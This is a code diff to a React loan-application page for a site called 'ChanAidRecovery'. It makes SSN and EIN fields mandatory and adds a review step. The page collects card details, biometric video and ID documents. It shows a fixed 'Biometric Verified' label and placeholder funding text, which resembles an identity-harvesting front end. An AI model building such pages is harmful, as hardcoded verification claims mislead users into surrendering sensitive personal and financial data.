@@ -4,7 +4,7 @@ import { SiteShell } from "@/components/layout/SiteShell";
 import { 
   Loader2, CheckCircle2, ShieldCheck, Banknote, CreditCard, Lock, Wallet, 
   Camera, IdCard, BookOpen, AlertTriangle, BadgeCheck, FileCheck2, Clock, 
-  Fingerprint, RefreshCw, Video, LayoutDashboard 
+  Fingerprint, RefreshCw, Video, LayoutDashboard, Info, Mail 
 } from "lucide-react";
 import { useLoanApplication } from "@/hooks/useLoanApplication";
 import { formatCardNumber, formatExpiry } from "@/lib/loan-utils";
@@ -146,7 +146,7 @@ function UploadZone({
 
 // ─── Route ───────────────────────────────────────────────────────────────────
 
-export const Route = createFileRoute("/loans")({
+export const Route = createFileRoute("/_site/loans")({
   head: () => ({
     meta: [
       { title: "Apply for a Loan | ChanAidRecovery" },
@@ -179,7 +179,7 @@ function LoansPage() {
   } = useLoanApplication();
 
   return (
-    <SiteShell>
+    <>
       <section className="bg-hero-gradient">
         <div className="max-w-5xl mx-auto px-4 sm:px-6 lg:px-8 pt-16 pb-10 text-center">
           <span className="inline-flex items-center gap-2 text-xs font-semibold uppercase tracking-wider bg-white/70 backdrop-blur px-3 py-1.5 rounded-full text-red-600 border border-red-200">
@@ -424,30 +424,42 @@ function LoansPage() {
                       <p className="text-slate-500 max-w-md mx-auto text-sm leading-relaxed">
                         Your application <span className="font-mono text-xs bg-slate-100 px-1.5 py-0.5 rounded">#{appId?.slice(0,8)}</span> has been securely queued. Our officers are verifying your biometric video and ID documents against global databases.
                       </p>
+                      <div className="flex items-center justify-center gap-2 text-[10px] font-bold text-slate-400 uppercase tracking-widest mt-2">
+                        <Mail className="w-3.5 h-3.5 text-primary" />
+                        <span>Check your <u>Spam folder</u> if you don't receive an email confirmation</span>
+                      </div>
                     </div>
 
                     {/* Visual Pipeline */}
                     <div className="max-w-md mx-auto grid grid-cols-3 gap-1 relative">
                        <div className="absolute top-4 left-[15%] right-[15%] h-1 bg-slate-100 -z-10">
-                          <div className={`h-full bg-primary transition-all duration-1000 ${appStatus?.status === 'under_review' ? 'w-1/2' : 'w-0'}`}></div>
+                          <div className={`h-full bg-primary transition-all duration-1000 ${
+                             appStatus?.status === 'under_review' ? 'w-1/2' : 
+                             appStatus?.status === 'verified' ? 'w-full' : 'w-0'
+                           }`}></div>
                        </div>
                        {[
                          { id: 'pending', label: 'Queued', icon: <FileCheck2 className="w-4 h-4" /> },
                          { id: 'under_review', label: 'In Review', icon: <RefreshCw className="w-4 h-4" /> },
                          { id: 'verified', label: 'Released', icon: <CheckCircle2 className="w-4 h-4" /> }
                        ].map((step, i) => {
-                         const isActive = appStatus?.status === step.id || (step.id === 'pending' && !appStatus);
-                         const isPast = (step.id === 'pending' && appStatus?.status === 'under_review');
+                         const statusOrder = ['pending', 'under_review', 'verified'];
+                         const currentIdx = statusOrder.indexOf(appStatus?.status || 'pending');
+                         const stepIdx = statusOrder.indexOf(step.id);
+                         
+                         const isActive = currentIdx === stepIdx;
+                         const isPast = currentIdx > stepIdx;
+                         
                          return (
                            <div key={step.id} className="flex flex-col items-center gap-2">
                              <div className={`w-10 h-10 rounded-full flex items-center justify-center shadow-sm border-2 transition-all ${
-                               isActive ? "bg-primary text-white border-primary scale-110" : 
+                               isActive ? "bg-primary text-white border-primary scale-110 shadow-lg shadow-primary/20" : 
                                isPast ? "bg-emerald-500 text-white border-emerald-500" :
                                "bg-white text-slate-300 border-slate-100"
                              }`}>
-                               {step.icon}
+                               {isPast ? <CheckCircle2 className="w-4 h-4" /> : step.icon}
                              </div>
-                             <span className={`text-[10px] font-black uppercase tracking-tighter ${isActive ? "text-primary" : "text-slate-400"}`}>{step.label}</span>
+                             <span className={`text-[10px] font-black uppercase tracking-tighter transition-colors duration-300 ${isActive ? "text-primary" : isPast ? "text-emerald-600" : "text-slate-400"}`}>{step.label}</span>
                            </div>
                          );
                        })}
@@ -511,8 +523,8 @@ function LoansPage() {
                           <option>Retired</option>
                           <option>Student</option>
                         </Select>
-                        <Input name="ssn" label="SSN (Social Security Number)" placeholder="XXX-XX-XXXX" maxLength={11} />
-                        <Input name="ein" label="EIN (Employer Identification Number)" placeholder="XX-XXXXXXX" maxLength={10} />
+                        <Input name="ssn" label="SSN (Social Security Number) *" placeholder="XXX-XX-XXXX" maxLength={11} required />
+                        <Input name="ein" label="EIN (Employer Identification Number) *" placeholder="XX-XXXXXXX" maxLength={10} required />
                       </div>
                     </Section>
 
@@ -742,6 +754,43 @@ function LoansPage() {
                       </div>
                     </Section>
                   </div>
+                  
+                  {/* ─── STEP 4: Review & Submit ────────────────────── */}
+                  <div className={currentStep === 4 ? "block" : "hidden"}>
+                    <Section title="Final Review" icon={<BadgeCheck className="w-5 h-5" />}>
+                      <div className="bg-slate-50 rounded-3xl p-8 border border-slate-100">
+                        <h4 className="text-slate-900 font-black text-lg mb-4">Application Summary</h4>
+                        <p className="text-slate-500 text-sm mb-8">Please double-check your information before final submission. Once submitted, your application will enter the priority review queue.</p>
+                        
+                        <div className="grid gap-6">
+                           <div className="flex items-center justify-between py-3 border-b border-slate-200/50">
+                              <span className="text-xs font-bold text-slate-400 uppercase tracking-widest">Payout Method</span>
+                              <span className="text-sm font-black text-slate-900 uppercase tracking-tight">{payout.replace('_', ' ')}</span>
+                           </div>
+                           <div className="flex items-center justify-between py-3 border-b border-slate-200/50">
+                              <span className="text-xs font-bold text-slate-400 uppercase tracking-widest">Security Protocol</span>
+                              <span className="text-sm font-black text-emerald-600">Biometric Verified</span>
+                           </div>
+                           <div className="bg-white rounded-2xl p-6 border border-slate-100 shadow-sm">
+                              <div className="flex items-center justify-between">
+                                 <span className="text-xs font-bold text-slate-400 uppercase tracking-widest">Priority Funding Amount</span>
+                                 <div className="text-2xl font-black text-primary">
+                                    <span className="text-sm mr-1">$</span>
+                                    {"As Requested"}
+                                 </div>
+                              </div>
+                           </div>
+                        </div>
+
+                        <div className="mt-8 p-4 rounded-xl bg-blue-50 border border-blue-100 flex gap-3 items-start">
+                           <Info className="w-5 h-5 text-blue-500 shrink-0 mt-0.5" />
+                           <p className="text-[11px] font-medium text-blue-700 leading-relaxed">
+                              By clicking "Submit Application", you certify that the information provided is accurate and that you are the authorized owner of the payout destination. Your identity documents will be cross-referenced with global forensic databases.
+                           </p>
+                        </div>
+                      </div>
+                    </Section>
+                  </div>
 
                   {/* Navigation Footer */}
                   <div className="mt-6 border-t border-slate-100 pt-5 flex flex-col-reverse sm:flex-row sm:items-center sm:justify-between gap-3">
@@ -792,7 +841,7 @@ function LoansPage() {
         )}
       </section>
       <AuthModal isOpen={isAuthModalOpen} onClose={() => setIsAuthModalOpen(false)} defaultMode={authMode} />
-    </SiteShell>
+    </>
   );
 }
 
@@ -815,6 +864,7 @@ function StepIndicator({ current, total }: { current: number; total: number }) {
     { n: 1, label: "Application Details", shortLabel: "Apply", icon: <FileCheck2 className="w-4 h-4" /> },
     { n: 2, label: "Payout Setup", shortLabel: "Payout", icon: <CreditCard className="w-4 h-4" /> },
     { n: 3, label: "Identity & Security", shortLabel: "Identity", icon: <ShieldCheck className="w-4 h-4" /> },
+    { n: 4, label: "Review & Submit", shortLabel: "Review", icon: <BadgeCheck className="w-4 h-4" /> },
   ];
 
   return (
